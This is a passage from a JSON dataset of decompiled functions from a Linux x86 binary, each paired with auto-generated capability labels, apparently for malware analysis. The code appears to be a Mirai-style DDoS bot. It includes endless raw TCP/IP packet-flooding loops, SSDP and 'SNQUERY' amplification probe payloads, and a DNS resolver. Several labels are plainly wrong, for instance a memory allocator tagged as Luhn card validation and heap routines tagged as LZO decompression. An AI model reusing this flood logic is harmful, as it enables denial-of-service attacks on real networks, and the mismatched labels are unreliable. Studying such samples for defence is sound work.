8);\n                            uVar14 = *(param_4 + 8);\n                            uVar13 = *(param_4 + 8) >> 0x10;\n                            piVar27[2] = CONCAT22(uVar14 >> 8 | uVar14 << 8, uVar13 >> 8 | uVar13 << 8);\n                            *(piVar27 + 3) = *(param_4 + 2);\n                            *(piVar27 + 0xe) = uStack292;\n                            uVar26 = fcn.08050421(iVar19 + 0x28);\n                            *(iVar18 + iVar24 * 4) = uVar26;\n                            puVar23 = *(iVar18 + iStack20 * 4);\n                            *puVar23 = 0x45;\n                            param_4 = puVar23 + 0x14;\n                            puVar23[1] = uVar1;\n                            uVar14 = iVar19 + 0x28;\n                            *(puVar23 + 2) = uVar14 >> 8 | uVar14 * 0x100;\n                            *(puVar23 + 4) = uVar11 >> 8 | uVar11 << 8;\n                            puVar23[8] = uVar2;\n                            if (cVar3 != '\\0') {\n                                *(puVar23 + 6) = 0x40;\n                            }\n                            puVar23[9] = 6;\n                            *(puVar23 + 0xc) = *0x80588a0;\n                            iVar21 = iStack20 * 0x10;\n                            *(puVar23 + 0x10) = *(iVar21 + iVar17);\n                            *(puVar23 + 0x14) = *(iVar21 + 0xc + iVar17);\n                            *(puVar23 + 0x16) = *(iVar21 + 0xe + iVar17);\n                            *(puVar23 + 0x18) = *(iVar21 + 8 + iVar17);\n                            *(puVar23 + 0x1c) = *(iVar21 + 4 + iVar17);\n                            puVar23[0x21] = puVar23[0x21] | 0x11;\n                            puVar23[0x20] = puVar23[0x20] & 0xf | 0x80;\n                            uVar22 = fcn.0804db30();\n                            *(puVar23 + 0x22) = uVar22;\n                            uVar22 = uVar22 & 0xffffff00 | puVar23[0x21] & 0xffffffc0 | (uVar4 & 1) << 5 |\n                                     (uVar5 & 1) << 4 | (uVar6 & 1) << 3 | (uVar7 & 1) << 2 | (uVar8 & 1) * 2 |\n                                     uVar9 & 1;\n                            puVar23[0x21] = uVar22;\n                            fcn.0804dcd0(puVar23 + 0x28, iVar19, uVar22, uVar22);\n                            uVar26 = extraout_ECX_02;\n                            goto code_r0x08049ec7;\n                        }\n                        if ((uStack279 & 5) != 0) break;\n                    }\n                    iVar24 = fcn.0804ecea(0);\n                    puVar25 = iVar24 - puVar23;\n                } while (puVar25 < 0xb);\n                fcn.0804eaab(iVar21);\n                uVar26 = extraout_ECX_01;\n            }\ncode_r0x08049ec7:\n            iStack20 = iStack20 + 1;\n        } while (iStack20 < uVar16);\n    }\n    do {\n        do {\n        } while (uVar16 == 0);\n        iStack368 = iVar19 + 0x14;\n        iStack372 = iVar19 + 0x28;\n        iStack20 = 0;\n        uVar12 = iVar19 + 0x14;\n        do {\n            iVar21 = *(iVar18 + iStack20 * 4);\n            iVar24 = iStack20;\n            if (uVar11 == 0xffff) {\n                uVar15 = fcn.0804db30();\n                *(iVar21 + 4) = uVar15;\n                iVar24 = extraout_EDX_00;\n            }\n            if (cVar10 != '\\0') {\n                fcn.0804dcd0(iVar21 + 0x28, iVar19, puVar23, puVar23);\n                iVar24 = extraout_EDX;\n            }\n            *(iVar21 + 10) = 0;\n            uVar15 = fcn.0804bd80(iVar21, 0x14, iVar24, iVar24);\n            *(iVar21 + 10) = uVar15;\n            puVar23 = iVar17 + iStack20 * 0x10;\n            *(iVar21 + 0x24) = 0;\n            iVar24 = *(puVar23 + 4);\n            *(puVar23 + 4) = iVar24 + 1;\n            uVar14 = iVar24;\n            *(iVar21 + 0x18) = uVar14 >> 8 | uVar14 << 8;\n            uVar14 = *(iStack20 * 0x10 + 8 + iVar17);\n            *(iVar21 + 0x1c) = uVar14 >> 8 | uVar14 << 8;\n            uVar15 = fcn.0804bdd0(iVar21, iVar21 + 0x14, uVar12 >> 8 | uVar12 * 0x100, iStack368);\n            *(iVar21 + 0x24) = uVar15;\n            *(iStack20 * 0x18 + 2 + param_2) = *(iVar21 + 0x16);\n            fcn.08050352(iVar20, iVar21, iStack372, 0x4000, iStack20 * 0x18 + param_2, 0x10);\n            iStack20 = iStack20 + 1;\n        } while (iStack20 < uVar16);\n    } while( true );\n}\n",
        "token_count": 3076
    },
    "0804b7c0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0804b7c0(uint8_t param_1, int32_t param_2, uint8_t param_3, uint param_4)\n\n{\n    char **ppcVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    int32_t iVar21;\n    int32_t iVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint uVar25;\n    uint32_t uVar26;\n    uint32_t uVar27;\n    uint16_t uVar28;\n    uint32_t uStack136;\n    char *apcStack124 [2];\n    int32_t iStack116;\n    int32_t iStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    int32_t iStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    char *pcStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    char *pcStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    iVar5 = fcn.08051493();\n    iVar6 = fcn.08051493();\n    iVar7 = fcn.08051493();\n    iVar8 = fcn.08051493();\n    iVar9 = fcn.08051493();\n    iVar10 = fcn.08051493();\n    iVar11 = fcn.08051493();\n    iVar12 = fcn.08051493();\n    iVar13 = fcn.08051493();\n    iVar14 = fcn.08051493();\n    iVar15 = fcn.08051493();\n    iVar16 = fcn.08051493();\n    iVar17 = fcn.08051493();\n    iVar18 = fcn.08051493();\n    iVar19 = fcn.08051493();\n    iVar20 = fcn.08051493();\n    iVar21 = fcn.08051493();\n    iVar22 = fcn.08051493();\n    apcStack124[1] = \"\\r\\n\\r\\n\";\n    uStack108 = 0x8053548;\n    uStack104 = 0x8053574;\n    iStack116 = iVar5 % 0x101 + 0x8053508 + iVar6 % 0x101;\n    uStack100 = 0x8053528;\n    uStack92 = 0x80535a8;\n    uStack88 = 0x80535e5;\n    uStack84 = 0x80535f0;\n    uStack80 = 0x8053624;\n    uStack76 = 0x805365c;\n    uStack72 = 0x80536f9;\n    uStack68 = 0x8053712;\n    iStack112 = iVar7 % 0x101 + 0x8053528 + iVar8 % 0x101;\n    pcStack64 = \"SNQUERY: 127.0.0.1:AAAAAA:xsvr\";\n    uStack60 = 0x805372a;\n    uStack56 = 0x8053505;\n    uStack52 = 0x805373c;\n    pcStack48 = \n    \"M-SEARCH * HTTP/1.1\\r\\nHOST: 255.255.255.255:1900\\r\\nMAN: \\\"ssdp:discover\\\"\\r\\nMX: 1\\r\\nST: urn:dial-multiscreen-org:service:dial:1\\r\\nUSER-AGENT: Google Chrome/60.0.3112.90 Windows\\r\\n\\r\\n\"\n    ;\n    iVar5 = iVar11 % 0x101 + iVar12 % 0x101 + iVar14 % 0x101 + iVar16 % 0x101 + iVar18 % 0x101 + iVar20 % 0x101;\n    iStack96 = iVar9 % 0x101 + iVar10 % 0x101 + iVar13 % 0x101 + iVar15 % 0x101 + iVar17 % 0x101 + iVar19 % 0x101 +\n               iVar21 % 0x101 + 0x8053506 + iVar5 + iVar22 % 0x101;\n    uStack44 = 0x805375c;\n    uVar26 = param_1;\n    uStack40 = 0x805378c;\n    uStack36 = 0x8053844;\n    iVar5 = fcn.08050b95(uVar26, 4, iVar5, iVar5);\n    iVar6 = fcn.08050b95(uVar26, 4);\n    uVar24 = param_3;\n    uVar2 = fcn.08048690(uVar24, param_4, 7, 0xffff);\n    uVar23 = fcn.08048690(uVar24, param_4, 6, 0xffff);\n    fcn.08048690(uVar24, param_4, 0, 0x400);\n    fcn.08048690(uVar24, param_4, 1, 1);\n    uStack32 = 0;\n    uStack28 = 0;\n    uStack24 = 0;\n    uStack20 = 0;\n    uVar28 = uVar23;\n    if (uVar28 == 0xffff) {\n        uVar28 = fcn.0804db30();\n    }\n    else {\n        uVar28 = uVar28 >> 8 | uVar28 << 8;\n        uVar23 = uVar23 & 0xffff0000 | uVar28;\n    }\n    uVar27 = param_1;\n    if (uVar27 != 0) {\n        uStack136 = 1;\n        do {\n            uVar25 = fcn.08050b95(0xffff, 1, param_2, param_2);\n            *(iVar5 + -4 + uStack136 * 4) = uVar25;\n            if (uVar2 == 0xffff) {\n                uVar25 = fcn.0804db30();\n                *(param_2 + 2) = uVar25;\n            }\n            else {\n                uVar3 = uVar2 >> 8 | uVar2 << 8;\n                uVar25 = CONCAT22(uVar28, uVar3);\n                *(param_2 + 2) = uVar3;\n            }\n            iVar7 = fcn.080503d0(2, 2, 0, uVar25);\n            *(iVar6 + -4 + uStack136 * 4) = iVar7;\n            if (iVar7 == -1) {\n                return;\n            }\n            uStack32 = uVar28 << 0x10 | 2;\n            uStack28 = 0;\n            fcn.080501ca(iVar7, &uStack32, 0x10, uVar24);\n            if (*(param_2 + 0x14) < 0x20) {\n                uVar25 = *(param_2 + 0x10);\n                uVar24 = fcn.0804db30();\n                uVar3 = uVar25;\n                uVar4 = uVar25 >> 0x10;\n                uVar23 = CONCAT22(uVar3 >> 8 | uVar3 << 8, uVar4 >> 8 | uVar4 << 8);\n                iVar7 = (uVar24 >> (*(param_2 + 0x14) & 0x1f)) + uVar23;\n                uVar3 = iVar7;\n                uVar4 = iVar7 >> 0x10;\n                *(param_2 + 4) = CONCAT22(uVar3 >> 8 | uVar3 << 8, uVar4 >> 8 | uVar4 << 8);\n            }\n            fcn.080501f5(*(iVar6 + -4 + uStack136 * 4), param_2, 0x10, uVar23);\n            uStack136 = uStack136 + 1;\n            param_2 = param_2 + 0x18;\n            uVar24 = uVar26 + 1;\n        } while (uStack136 != uVar26 + 1);\n    }\n    do {\n        do {\n        } while (uVar27 == 0);\n        iVar5 = 1;\n        uVar24 = uVar27;\n        do {\n            iVar8 = fcn.0804ff0e(apcStack124[iVar5], uVar24, uVar24, 0x4000);\n            ppcVar1 = apcStack124 + iVar5;\n            iVar7 = iVar5 * 4;\n            iVar5 = iVar5 + 1;\n            uVar24 = fcn.0805031f(*(iVar6 + -4 + iVar7), *ppcVar1, iVar8 + 1);\n        } while (uVar26 + 1 != iVar5);\n    } while( true );\n}\n",
        "token_count": 2126
    },
    "08050b95": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint * fcn.08050b95(uint32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint extraout_ECX;\n    uint *puVar3;\n    uchar auStack28 [16];\n    \n    if ((param_1 == 0) || (param_2 == (param_1 * param_2) / param_1)) {\n        fcn.08051b29(auStack28, fcn.08051b26, 0x8056670);\n        fcn.08051b26(0x8056670);\n        puVar3 = fcn.08050421(param_1 * param_2);\n        puVar2 = puVar3;\n        if ((puVar3 != NULL) && (puVar2 = puVar3[-1],  (puVar2 & 2) == 0)) {\n            uVar1 = (puVar2 & 0xfffffffc) - 4;\n            puVar2 = uVar1 >> 2;\n            if (puVar2 < 0xa) {\n                *puVar3 = 0;\n                puVar3[1] = 0;\n                puVar3[2] = 0;\n                if (0x4 < puVar2) {\n                    puVar3[3] = 0;\n                    puVar3[4] = 0;\n                    if (0x6 < puVar2) {\n                        puVar3[5] = 0;\n                        puVar3[6] = 0;\n                        if (0x8 < puVar2) {\n                            puVar3[7] = 0;\n                            puVar3[8] = 0;\n                        }\n                    }\n                }\n            }\n            else {\n                puVar2 = fcn.0804fef9(puVar3, 0, uVar1, extraout_ECX);\n            }\n        }\n        fcn.08051b29(auStack28, 1, puVar2, puVar2);\n    }\n    else {\n        puVar2 = fcn.0804efb0();\n        puVar3 = NULL;\n        *puVar2 = 0xc;\n    }\n    return puVar3;\n}\n",
        "token_count": 489
    },
    "08050fb1": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint __regparm3 fcn.08050fb1(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    uVar1 = *(param_2 + 0x35c);\n    uVar4 = *(*(param_2 + 0x2c) + 4) & 0xfffffffc;\n    iVar3 = (((uVar4 - param_1) + -0x11 + uVar1) / uVar1 - 1) * uVar1;\n    if ((0 < iVar3) && (iVar2 = fcn.08052384(0),  iVar2 == uVar4 + *(param_2 + 0x2c))) {\n        fcn.08052384(-iVar3);\n        iVar3 = fcn.08052384(0);\n        if ((iVar3 != -1) && (iVar2 = iVar2 - iVar3,  iVar2 != 0)) {\n            *(param_2 + 0x368) = *(param_2 + 0x368) - iVar2;\n            *(*(param_2 + 0x2c) + 4) = uVar4 - iVar2 | 1;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 301
    },
    "0805103e": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.0805103e(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uint32_t *extraout_ECX;\n    uint32_t *puVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    ulong uVar12;\n    uint32_t **ppuStack32;\n    \n    iVar9 = 1;\n    if (*param_1 == 0) {\n        for (; iVar9 < 0x60; iVar9 = iVar9 + 1) {\n            puVar8 = param_1 + iVar9 * 2 + 0xb;\n            puVar8[3] = puVar8;\n            puVar8[2] = puVar8;\n        }\n        param_1[0xd8] = param_1[0xd8] | 1;\n        param_1[0xd2] = 0;\n        param_1[0xd5] = 0x10000;\n        param_1[0xd3] = 0x40000;\n        param_1[0xd1] = 0x40000;\n        *param_1 = *param_1 & 3 | 0x48;\n        param_1[0xb] = param_1 + 0xd;\n        uVar7 = fcn.080519a2(0x1e);\n        param_1[0xd7] = uVar7;\n        return;\n    }\n    *param_1 = *param_1 & 0xfffffffd;\n    ppuStack32 = param_1 + 1;\n    uVar7 = *param_1;\n    do {\n        puVar8 = *ppuStack32;\n        if (puVar8 != NULL) {\n            *ppuStack32 = NULL;\n            do {\n                puVar2 = puVar8[2];\n                uVar11 = puVar8[1] & 0xfffffffe;\n                uVar1 = puVar8 + uVar11;\n                uVar3 = *(uVar1 + 4);\n                if ((puVar8[1] & 1) == 0) {\n                    uVar10 = *puVar8;\n                    puVar6 = puVar8 - uVar10;\n                    uVar4 = puVar6[2];\n                    uVar5 = puVar6[3];\n                    puVar8 = *(uVar4 + 0xc);\n                    if ((puVar8 == puVar6) && (*(uVar5 + 8) == puVar8)) {\n                        uVar11 = uVar11 + uVar10;\n                        *(uVar4 + 0xc) = uVar5;\n                        *(uVar5 + 8) = uVar4;\n                        goto code_r0x080510d9;\n                    }\ncode_r0x08051109:\n                    uVar12 = fcn.08051382();\n                    puVar8 = extraout_ECX;\ncode_r0x0805110e:\n                    iVar9 = uVar12 >> 0x20;\n                    uVar11 = uVar11 + uVar10;\n                    *(iVar9 + 0xc) = uVar12;\n                    *(uVar12 + 8) = iVar9;\ncode_r0x08051116:\n                    uVar1 = param_1[0xf];\n                    param_1[0xf] = puVar8;\n                    *(uVar1 + 0xc) = puVar8;\n                    puVar8[1] = uVar11 | 1;\n                    puVar8[2] = uVar1;\n                    puVar8[3] = param_1 + 0xd;\n                    *(puVar8 + uVar11) = uVar11;\n                }\n                else {\ncode_r0x080510d9:\n                    uVar10 = uVar3 & 0xfffffffc;\n                    if (uVar1 != param_1[0xb]) {\n                        uVar3 = *(uVar1 + 4 + uVar10);\n                        *(uVar1 + 4) = uVar10;\n                        if ((uVar3 & 1) == 0) {\n                            uVar12 = CONCAT44(*(uVar1 + 8), *(uVar1 + 0xc));\n                            uVar3 = *(*(uVar1 + 8) + 0xc);\n                            if ((uVar3 != uVar1) || (*(*(uVar1 + 0xc) + 8) != uVar3)) goto code_r0x08051109;\n                            goto code_r0x0805110e;\n                        }\n                        goto code_r0x08051116;\n                    }\n                    puVar8[1] = uVar11 + uVar10 | 1;\n                    param_1[0xb] = puVar8;\n                }\n                puVar8 = puVar2;\n            } while (puVar2 != NULL);\n        }\n        if (ppuStack32 == param_1 + ((uVar7 >> 3) - 1)) {\n            return;\n        }\n        ppuStack32 = ppuStack32 + 1;\n    } while( true );\n}\n",
        "token_count": 1163
    },
    "080511e6": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.080511e6(uint32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint32_t *extraout_ECX;\n    uint32_t *puVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    ulong uVar10;\n    uchar auStack32 [16];\n    \n    if (param_1 == NULL) {\n        return;\n    }\n    fcn.08051b29(auStack32, fcn.08051b26, 0x8056670);\n    fcn.08051b26(0x8056670);\n    puVar6 = param_1 + -2;\n    uVar5 = param_1[-1];\n    uVar8 = uVar5 & 0xfffffffc;\n    if (uVar8 <= *0x8058940) {\n        *0x8058940 = *0x8058940 | 3;\n        iVar7 = (uVar5 >> 3) * 4;\n        uVar5 = *(iVar7 + 0x805893c);\n        *param_1 = uVar5;\n        *(iVar7 + 0x805893c) = puVar6;\n        goto code_r0x08051369;\n    }\n    if ((uVar5 & 2) != 0) {\n        *0x8058c90 = *0x8058c90 + -1;\n        iVar7 = uVar8 + param_1[-2];\n        *0x8058ca4 = *0x8058ca4 - iVar7;\n        uVar5 = fcn.080522f2(puVar6 - param_1[-2], iVar7, uVar8, uVar8);\n        goto code_r0x08051369;\n    }\n    *0x8058940 = *0x8058940 | 1;\n    puVar1 = puVar6 + uVar8;\n    uVar5 = puVar1[1];\n    if ((*(param_1 + -1) & 1) == 0) {\n        uVar9 = param_1[-2];\n        puVar4 = puVar6 - uVar9;\n        uVar2 = puVar4[2];\n        uVar3 = puVar4[3];\n        puVar6 = *(uVar2 + 0xc);\n        if ((puVar6 == puVar4) && (*(uVar3 + 8) == puVar6)) {\n            uVar8 = uVar8 + uVar9;\n            *(uVar2 + 0xc) = uVar3;\n            *(uVar3 + 8) = uVar2;\n            goto code_r0x08051293;\n        }\ncode_r0x080512c2:\n        uVar10 = fcn.08051382();\n        puVar6 = extraout_ECX;\ncode_r0x080512c7:\n        iVar7 = uVar10 >> 0x20;\n        *(iVar7 + 0xc) = uVar10;\n        *(uVar10 + 8) = iVar7;\n        uVar8 = uVar8 + uVar9;\ncode_r0x080512cf:\n        puVar6[3] = 0x8058974;\n        puVar6[2] = *0x805897c;\n        *(puVar6 + uVar8) = uVar8;\n        (*0x805897c)[3] = puVar6;\n        uVar5 = uVar8 | 1;\n        *0x805897c = puVar6;\n        puVar6[1] = uVar5;\n    }\n    else {\ncode_r0x08051293:\n        uVar9 = uVar5 & 0xfffffffc;\n        if (puVar1 != *0x805896c) {\n            uVar5 = *(puVar1 + uVar9 + 4);\n            puVar1[1] = uVar9;\n            if ((uVar5 & 1) == 0) {\n                uVar10 = CONCAT44(puVar1[2], puVar1[3]);\n                puVar4 = *(puVar1[2] + 0xc);\n                if ((puVar4 != puVar1) || (*(puVar1[3] + 8) != puVar4)) goto code_r0x080512c2;\n                goto code_r0x080512c7;\n            }\n            goto code_r0x080512cf;\n        }\n        uVar8 = uVar8 + uVar9;\n        uVar5 = uVar8 | 1;\n        puVar6[1] = uVar5;\n        *0x805896c = puVar6;\n    }\n    if (0x1ffff < uVar8) {\n        if ((*0x8058940 & 2) != 0) {\n            fcn.0805103e(0x8058940);\n        }\n        uVar5 = (*0x805896c)[1] & 0xfffffffc;\n        if (*0x8058c84 <= uVar5) {\n            uVar5 = fcn.08050fb1();\n        }\n    }\ncode_r0x08051369:\n    fcn.08051b29(auStack32, 1, uVar5, uVar5);\n    return;\n}\n",
        "token_count": 1202
    },
    "0804de00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0804df4d)\n\nuint8_t * fcn.0804de00(char *param_1)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uchar *puVar8;\n    char *extraout_ECX;\n    uint8_t *puVar9;\n    uint16_t uVar10;\n    char *pcVar11;\n    uint8_t *puVar12;\n    int16_t *piVar13;\n    char cVar14;\n    char *pcVar15;\n    uint *puVar16;\n    bool bVar17;\n    int16_t aiStack53420 [24542];\n    uint uStack4336;\n    uchar *puStack4332;\n    uint *puStack4328;\n    uint uStack4324;\n    uint uStack4320;\n    uint8_t *puStack4316;\n    uchar *puStack4312;\n    char *pcStack4308;\n    char *pcStack4304;\n    uint8_t *puStack4300;\n    char *pcStack4296;\n    char *pcStack4292;\n    int32_t iStack4288;\n    int16_t iStack4282;\n    uint16_t uStack4274;\n    int16_t iStack4268;\n    uint16_t uStack4262;\n    char acStack4256 [5];\n    uint8_t auStack4251 [2031];\n    int16_t iStack2220;\n    ushort uStack2218;\n    ushort uStack2216;\n    char cStack2208;\n    char acStack2207 [2035];\n    uint auStack172 [32];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    cVar14 = '\\0';\n    puStack4312 = 0x8;\n    puStack4316 = 0x1;\n    uStack4320 = 0x804de1c;\n    puStack4300 = fcn.08050b95();\n    pcStack4296 = &stack0xfffff760;\n    puStack4316 = param_1;\n    uStack4320 = 0x804de33;\n    iVar5 = fcn.0804e4f0();\n    pcVar11 = &stack0xfffff761;\n    pcVar15 = pcStack4296;\n    for (iVar5 = iVar5 + 1; 0 < iVar5; iVar5 = iVar5 + -1) {\n        cVar2 = *param_1;\n        if ((cVar2 == '.') || (cVar2 == '\\0')) {\n            *pcVar15 = cVar14;\n            pcVar15 = pcVar11;\n            cVar14 = '\\0';\n        }\n        else {\n            *pcVar11 = cVar2;\n            cVar14 = cVar14 + '\\x01';\n        }\n        pcVar11 = pcVar11 + 1;\n        param_1 = param_1 + 1;\n    }\n    *pcVar11 = '\\0';\n    puStack4316 = pcStack4296;\n    uStack4320 = 0x804de7a;\n    iVar5 = fcn.0804e4f0();\n    pcVar15 = pcStack4296;\n    uStack44 = 0;\n    uStack40 = 0;\n    uStack36 = 0;\n    uStack32 = 0;\n    pcVar11 = pcStack4296 + iVar5 + 1;\n    puStack4316 = pcStack4296;\n    uStack4320 = 0x804deba;\n    iVar6 = fcn.0804e4f0();\n    pcStack4292 = iVar6 + 0x11;\n    uStack4320 = 0x804dec6;\n    uVar7 = fcn.0804db30();\n    iStack2220 = uVar7 + uVar7 / 0xffff;\n    puStack4312 = 0x10;\n    puStack4316 = &stack0xffffffd4;\n    uStack4320 = 0x804def6;\n    iStack4282 = iStack2220;\n    fcn.0804e5b0();\n    uStack44 = 0x35000002;\n    uStack2218 = 1;\n    uStack2216 = 0x100;\n    uStack40 = 0x8080808;\n    iStack4288 = 1;\n    *(pcVar15 + iVar5 + 1) = 0x100;\n    *(pcVar15 + iVar5 + 3) = 0x100;\ncode_r0x0804df5c:\n    pcStack4308 = NULL;\n    puStack4312 = 0x2;\n    puStack4316 = 0x2;\n    uStack4320 = 0x804df68;\n    pcStack4304 = pcVar11;\n    puVar8 = fcn.080503d0();\n    if (puVar8 == 0xffffffff) {\ncode_r0x0804e090:\n        puStack4316 = 0x1;\n        uStack4320 = 0x804e09a;\n        fcn.08051819();\n    }\n    else {\n        pcStack4308 = 0x10;\n        puStack4312 = &stack0xffffffd4;\n        uStack4320 = 0x804df87;\n        puStack4316 = puVar8;\n        pcStack4304 = extraout_ECX;\n        iVar5 = fcn.080501f5();\n        if (iVar5 == -1) goto code_r0x0804e090;\n        pcStack4304 = 0x4000;\n        pcStack4308 = pcStack4292;\n        puStack4312 = &stack0xfffff754;\n        uStack4320 = 0x804dfa9;\n        puStack4316 = puVar8;\n        iVar5 = fcn.0805031f();\n        if (iVar5 + 1 == NULL) goto code_r0x0804e090;\n        pcStack4308 = NULL;\n        puStack4316 = 0x3;\n        uStack4320 = 0x804dfbe;\n        puStack4312 = puVar8;\n        pcStack4304 = iVar5 + 1;\n        uVar7 = fcn.0804e9ed();\n        pcStack4308 = uVar7 | 0x800;\n        puStack4316 = 0x4;\n        uStack4320 = 0x804dfcd;\n        puStack4312 = puVar8;\n        fcn.0804e9ed();\n        puStack4328 = &stack0xffffff54;\n        puVar16 = puStack4328;\n        for (iVar5 = 0x20; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar16 = 0;\n            puVar16 = puVar16 + 1;\n        }\n        pcVar11 = puVar8 & 0x1f;\n        (&stack0xffffff54)[(pcVar11 >> 3) + (puVar8 >> 5) * 4] =\n             (&stack0xffffff54)[(pcVar11 >> 3) + (puVar8 >> 5) * 4] | '\\x01' << (puVar8 & 7);\n        uStack28 = 5;\n        uStack24 = 0;\n        puStack4316 = &stack0xffffffe4;\n        puStack4332 = puVar8 + 1;\n        uStack4320 = 0;\n        uStack4324 = 0;\n        uStack4336 = 0x804e01f;\n        uVar7 = fcn.0804ec3d();\n        if (uVar7 == 0xffffffff) goto code_r0x0804e0a4;\n        if (uVar7 != 0) {\n            bVar17 = ((&stack0xffffff54)[(pcVar11 >> 3) + (puVar8 >> 5) * 4] >> (puVar8 & 7) & 1) != 0;\n            pcVar11 = uVar7 & 0xffffff00 | bVar17;\n            if (!bVar17) goto code_r0x0804e0a4;\n            puStack4312 = NULL;\n            puStack4316 = NULL;\n            uStack4320 = 0x4000;\n            uStack4324 = 0x800;\n            puStack4328 = &stack0xffffef54;\n            uStack4336 = 0x804e055;\n            puStack4332 = puVar8;\n            pcStack4308 = pcVar11;\n            pcStack4304 = pcVar11;\n            pcVar11 = fcn.080502dc();\n            puStack4316 = pcStack4296;\n            uStack4320 = 0x804e064;\n            iVar5 = fcn.0804e4f0();\n            if (iVar5 + 0x11 <= pcVar11) {\n                pcStack4296 = &stack0xffffef60;\n                puStack4316 = &stack0xffffef60;\n                uStack4320 = 0x804e0df;\n                iVar5 = fcn.0804e4f0();\n                puVar9 = &stack0xffffef65 + iVar5;\n                if ((iStack4282 == iStack4268) && (uStack4262 != 0)) {\n                    uStack4274 = uStack4262 >> 8 | uStack4262 << 8;\n                    while (uStack4274 = uStack4274 - 1,  uStack4274 != 0xffff) {\n                        iVar5 = 0;\n                        iVar6 = 1;\n                        for (puVar12 = puVar9; uVar3 = *puVar12,  uVar3 != 0; puVar12 = puVar12 + 1) {\n                            while (0xbf < uVar3) {\n                                iVar5 = 1;\n                                puVar12 = &stack0xffff2f54 + uVar3 * 0x100 + puVar12[1];\n                                uVar3 = *puVar12;\n                                if (uVar3 == 0) goto code_r0x0804e15a;\n                            }\n                            iVar6 = iVar6 + (iVar5 == 0);\n                        }\ncode_r0x0804e15a:\n                        piVar13 = puVar9 + iVar6 + iVar5;\n                        piVar1 = piVar13 + 5;\n                        if ((*piVar13 == 0x100) && (piVar13[1] == 0x100)) {\n                            uVar10 = piVar13[4];\n                            uVar4 = uVar10 >> 8 | uVar10 << 8;\n                            if (uVar4 == 4) {\n                                uStack20 = *(piVar13 + 5);\n                                pcStack4308 = puVar12 & 0xffff0000 | uVar4 & 0xffffff00 | *(piVar13 + 0xd);\n                                puStack4312 = *puStack4300 * 4 + 4;\n                                puStack4316 = *(puStack4300 + 4);\n                                uStack4320 = 0x804e278;\n                                pcStack4304 = pcStack4308;\n                                iVar5 = fcn.08050c89();\n                                uVar3 = *puStack4300;\n                                *(puStack4300 + 4) = iVar5;\n                                *(iVar5 + uVar3 * 4) = uStack20;\n                                *puStack4300 = uVar3 + 1;\n                                uVar10 = piVar13[4];\n                            }\n                            puVar9 = piVar1 + (uVar10 >> 8 | uVar10 << 8);\n                        }\n                        else {\n                            iVar5 = 0;\n                            iVar6 = 1;\n                            for (piVar13 = piVar1; uVar3 = *piVar13,  uVar3 != 0; piVar13 = piVar13 + 1) {\n                                while (0xbf < uVar3) {\n                                    iVar5 = 1;\n                                    piVar13 = &stack0xffff2f54 + uVar3 * 0x100 + *(piVar13 + 1);\n                                    uVar3 = *piVar13;\n                                    if (uVar3 == 0) goto code_r0x0804e1a9;\n                                }\n                                iVar6 = iVar6 + (iVar5 == 0);\n                            }\ncode_r0x0804e1a9:\n                            puVar9 = piVar1 + iVar6 + iVar5;\n                        }\n                    }\ncode_r0x0804e0a4:\n                    uStack4320 = 0x804e0ad;\n                    puStack4316 = puVar8;\n                    fcn.0804eaab();\n                    if (*puStack4300 == 0) {\n                        puStack4316 = *(puStack4300 + 4);\n                        if (puStack4316 != NULL) {\n                            uStack4320 = 0x804e1c3;\n                            fcn.080511e6();\n                        }\n                        puStack4316 = puStack4300;\n                        uStack4320 = 0x804e1d3;\n                        fcn.080511e6();\n                        return NULL;\n                    }\n                    return puStack4300;\n                }\n            }\n        }\n    